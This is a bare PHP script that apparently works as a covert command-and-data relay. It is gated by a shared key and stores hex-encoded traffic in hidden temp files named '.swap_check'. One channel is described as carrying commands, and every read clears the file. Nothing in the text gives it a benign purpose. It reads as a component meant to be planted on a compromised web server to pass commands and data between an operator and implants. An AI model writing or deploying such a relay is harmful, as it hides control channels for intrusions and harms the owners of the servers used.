<?php
$k = "[PROXY_KEY]";   
$c_path  = @sys_get_temp_dir() . "/.swap_check0-";
$a_path = @sys_get_temp_dir() . "/.swap_check1";

// key must be provided
if (!isset($_POST['k'])
    // key must match
    || $_POST['k'] !== $k) {
    echo "ERR 5";
    goto end;
}

$storage_c = $c_path;
if (isset($_POST["i"]) && preg_match("/^[a-z0-9]{1,10}/si", $_POST["i"])) {
    $storage_c .= $_POST["i"];
}
$storage_a = $a_path;

if (isset($_POST["f"])) {
    switch ($_POST["f"]) {
        // a fetch reads from c storage
        case "c": 
            $content = @file_get_contents($storage_c);
            @file_put_contents($storage_c, "");
            echo $content;
        break;
        // c fetch reads from a storage
        case "a": 
            $content = @file_get_contents($storage_a);
            // clear a commands
            @file_put_contents($storage_a, "");
            echo $content;
        break;

    }
} else if (isset($_POST['p']) && isset($_POST['d'])) {
    // data separator is ";"
    if (!preg_match('/^[\:\;a-f0-9\.]+$/si', $_POST['d'])) {
        echo "ERR 1";
        goto end;
    }

    switch ($_POST["p"]) {
        case "a":
            $ret = @file_put_contents($storage_a, $_POST["d"], FILE_APPEND);
            echo $ret;
        break;
        case "c":
            $ret = @file_put_contents($storage_c, $_POST["d"]);
            echo $ret;
        break;
    }
}
end:
?>